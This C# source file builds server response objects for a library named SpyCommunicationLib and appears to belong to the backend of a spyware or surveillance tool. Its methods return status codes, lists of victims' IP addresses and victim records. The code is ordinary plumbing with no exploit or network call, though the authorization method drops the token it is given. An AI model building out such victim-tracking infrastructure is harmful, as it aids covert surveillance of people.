
using SpyCommunicationLib.Builders;
using SpyCommunicationLib.Entities;

namespace SpyCommunicationLib.Directors
{
    /// <summary>
    /// Director class for building various SpyResponse objects with preset response codes and content.
    /// </summary>
    public class ServerResponseDirector
    {
        /// <summary>
        /// Creates a successful response without content.
        /// </summary>
        /// <returns>A SpyResponse with Success code.</returns>
        public SpyResponse<object> GetSuccessResponse()
        {
            SpyResponseBuilder<object> builder = new SpyResponseBuilder<object>();
            builder.SetResponseCode(ResponseCode.Success);
            return builder.GetResponse();
        }

        /// <summary>
        /// Creates a generic error response without content.
        /// </summary>
        /// <returns>A SpyResponse with Error code.</returns>
        public SpyResponse<object> GetErrorResponse()
        {
            SpyResponseBuilder<object> builder = new SpyResponseBuilder<object>();
            builder.SetResponseCode(ResponseCode.Error);
            return builder.GetResponse();
        }

        /// <summary>
        /// Creates a Not Found response without content.
        /// </summary>
        /// <returns>A SpyResponse with NotFound code.</returns>
        public SpyResponse<object> GetNotFoundRequestResponse()
        {
            SpyResponseBuilder<object> builder = new SpyResponseBuilder<object>();
            builder.SetResponseCode(ResponseCode.NotFound);
            return builder.GetResponse();
        }

        /// <summary>
        /// Creates an Unauthorized response without content.
        /// </summary>
        /// <returns>A SpyResponse with Unauthorized code.</returns>
        public SpyResponse<object> GetUnauthorizedResponse()
        {
            SpyResponseBuilder<object> builder = new SpyResponseBuilder<object>();
            builder.SetResponseCode(ResponseCode.Unauthorized);
            return builder.GetResponse();
        }

        /// <summary>
        /// Creates a successful authentication response containing a JWT token.
        /// </summary>
        /// <param name="token">The JWT token string.</param>
        /// <returns>A SpyResponse with Success code and JWT content.</returns>
        public SpyResponse<object> GetAuthorizationSuccessResponse(string token)
        {
            SpyResponseBuilder<object> builder = new SpyResponseBuilder<object>();
            builder.SetResponseCode(ResponseCode.Success);
            return builder.GetResponse();
        }

        /// <summary>
        /// Creates a Bad Request response without content.
        /// </summary>
        /// <returns>A SpyResponse with BadRequest code.</returns>
        public SpyResponse<object> GetBadRequestResponse()
        {
            SpyResponseBuilder<object> builder = new SpyResponseBuilder<object>();
            builder.SetResponseCode(ResponseCode.BadRequest);
            return builder.GetResponse();
        }

        /// <summary>
        /// Creates a successful response with a list of victims' IP addresses.
        /// </summary>
        /// <param name="victims_ip">The collection of victims' IPs.</param>
        /// <returns>A SpyResponse with Success code and IP list content.</returns>
        public SpyResponse<IEnumerable<string>> GetVictimsIpListResponse(IEnumerable<string> victims_ip)
        {
            SpyResponseBuilder<IEnumerable<string>> _builder = new SpyResponseBuilder<IEnumerable<string>>();
            _builder.SetResponseCode(ResponseCode.Success);
            _builder.SetContent(victims_ip);
            return _builder.GetResponse(); ;
        }

        /// <summary>
        /// Creates a successful response with a collection of victim records.
        /// </summary>
        /// <param name="records">The collection of VictimRecord objects.</param>
        /// <returns>A SpyResponse with Success code and victim records content.</returns>
        public SpyResponse<IEnumerable<VictimRecord>> GetVictimRecordsResponse(IEnumerable<VictimRecord> records)
        {
            SpyResponseBuilder<IEnumerable<VictimRecord>> builder = new SpyResponseBuilder<IEnumerable<VictimRecord>>();
            builder.SetResponseCode(ResponseCode.Success);
            builder.SetContent(records);
            return builder.GetResponse();
        }

        /// <summary>
        /// Creates a successful response with a collection of user data.
        /// </summary>
        /// <param name="users_data">The collection of User objects.</param>
        /// <returns>A SpyResponse with Success code and users content.</returns>
        public SpyResponse<IEnumerable<User>> GetUsersResponse(IEnumerable<User> users_data)
        {
            SpyResponseBuilder<IEnumerable<User>> builder = new SpyResponseBuilder<IEnumerable<User>>();
            builder.SetResponseCode(ResponseCode.Success);
            builder.SetContent(users_data);
            return builder.GetResponse();
        }

        /// <summary>
        /// Creates a successful response indicating administrator status.
        /// </summary>
        /// <param name="isAdmin">Boolean indicating if the user is an administrator.</param>
        /// <returns>A SpyResponse with Success code and admin status content.</returns>
        public SpyResponse<object> GetAdminStatusResponse(bool isAdmin)
        {
            SpyResponseBuilder<object> builder = new SpyResponseBuilder<object>();
            builder.SetResponseCode(ResponseCode.Success);
            builder.SetContent(new { is_admin = isAdmin });
            return builder.GetResponse();
        }
    }
}
